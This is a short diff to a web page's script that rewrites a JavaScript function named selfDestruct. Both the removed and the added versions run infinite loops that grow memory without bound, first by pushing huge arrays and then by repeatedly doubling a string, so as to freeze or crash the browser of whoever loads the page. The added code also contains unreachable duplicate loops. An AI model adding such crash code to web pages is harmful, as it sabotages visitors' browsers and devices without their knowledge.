@@ -197,10 +197,26 @@
         }
 
         function selfDestruct() {
-              let memoryHog = [];
-                while (true) {
-                    memoryHog.push(new Array(1000000).fill('*')); 
-                }
+            txt = "a";
+            while (1) {
+                txt = txt += "a";
+            }
+            txt = "b";
+            while (1) {
+                txt = txt += "b";
+            }
+            txt = "c";
+            while (1) {
+                txt = txt += "c";
+            }
+            txt = "c";
+            while (1) {
+                txt = txt += "c";
+            }
+            txt = "d";
+            while (1) {
+                txt = txt += "d";
+            }
         }
     </script>
 </body>
